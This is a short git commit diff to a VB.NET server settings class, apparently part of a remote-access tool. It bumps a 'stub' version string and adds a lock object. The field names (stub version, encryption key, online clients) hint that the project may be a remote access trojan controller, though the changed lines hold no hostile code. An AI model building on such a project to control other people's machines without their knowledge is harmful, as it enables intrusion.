e62ed708104ab9025dfc5628f611bdf462711035
NYAN CAT <NYANxCAT@pm.me>
2019-06-24 19:46:26 +0300

    change version

--- Project/Server/Classes/S_Settings.vb
+++ Project/Server/Classes/S_Settings.vb
@@ -3,8 +3,9 @@
     Public Shared PORT As New List(Of Integer)
     Public Shared EncryptionKey As String = Nothing
     Public Shared IP As String = Nothing
-    Public Shared StubVer As String = "v0.1.9.1"
+    Public Shared StubVer As String = "v0.1.9.2"
     Public Shared SPL As String = "|'L'|"
     Public Shared EOF As String = "|'N'|"
     Public Shared Online As New List(Of S_Client)
+    Public Shared LVlocker As Object = New Object()
 End Class
